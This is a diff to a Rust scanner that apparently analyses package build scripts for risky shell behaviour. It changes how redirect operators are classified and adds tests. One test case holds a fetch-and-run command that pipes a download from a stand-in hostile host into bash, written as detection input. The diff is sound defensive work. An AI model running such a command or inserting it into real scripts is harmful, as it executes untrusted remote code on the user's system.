@@ -417,10 +417,44 @@ impl<'a> Walker<'a> {
     }
 
     fn on_redirect(&mut self, node: Node, cur_fn: Option<&str>) {
+        // Operators are anonymous AST children; destinations can themselves
+        // contain substitutions, which visit() continues to traverse below.
+        let mut cursor = node.walk();
+        let operator = node.children(&mut cursor).find(|child| !child.is_named());
+        let Some(operator) = operator else {
+            return;
+        };
+        // tree-sitter-bash 0.23 represents <> as '<' followed by an ERROR
+        // node containing the adjacent '>'. Preserve its read/write behavior.
+        let read_write = operator.kind() == "<"
+            && operator.next_sibling().is_some_and(|next| {
+                next.kind() == "ERROR"
+                    && self.text(next) == ">"
+                    && next.start_byte() == operator.end_byte()
+            });
+        if !read_write
+            && !matches!(
+                operator.kind(),
+                ">" | ">>" | ">|" | "&>" | "&>>" | ">&" | "<>"
+            )
+        {
+            return;
+        }
         let Some(dest) = node.child_by_field_name("destination") else {
             return;
         };
         let dest_text = unquote(self.text(dest));
+        // >&word is Bash's combined output redirect when word is a file;
+        // numeric destinations (optionally moved with '-') duplicate descriptors.
+        if operator.kind() == ">&"
+            && (dest_text == "-"
+                || dest_text
+                    .trim_end_matches('-')
+                    .bytes()
+                    .all(|b| b.is_ascii_digit()))
+        {
+            return;
+        }
         if self.is_system_path(dest_text) {
             self.feat.count_redirect_system += 1;
             let scope = cur_fn.unwrap_or("script");
@@ -755,6 +789,41 @@ mod tests {
                 "{name}: got {got:?}"
             );
         }
+    }
+
+    #[test]
+    fn input_redirects_and_descriptor_operations_do_not_write_files() {
+        for script in [
+            "cat < /etc/hostname",
+            "read value 3< /dev/sda",
+            "cat <& /etc/hostname",
+            "echo x 2>&1",
+            "echo x >&-",
+            "cat <&-",
+            "echo x 2>&3-",
+        ] {
+            assert!(write_findings(script).is_empty(), "{script}");
+        }
+    }
+
+    #[test]
+    fn all_file_output_redirect_operators_still_write() {
+        for op in [">", ">>", ">|", "&>", "&>>", ">&", "<>"] {
+            let script = format!("echo x {op} /etc/hostname");
+            assert_eq!(write_findings(&script).len(), 1, "{script}");
+        }
+    }
+
+    #[test]
+    fn commands_nested_inside_input_redirects_are_visited() {
+        let result = scan_str(
+            "cat < $(curl https://evil.example/x | bash)",
+            ScriptKind::Pkgbuild,
+        );
+        assert!(result
+            .findings
+            .iter()
+            .any(|f| f.reason.contains("piped directly")));
     }
 
     #[test]
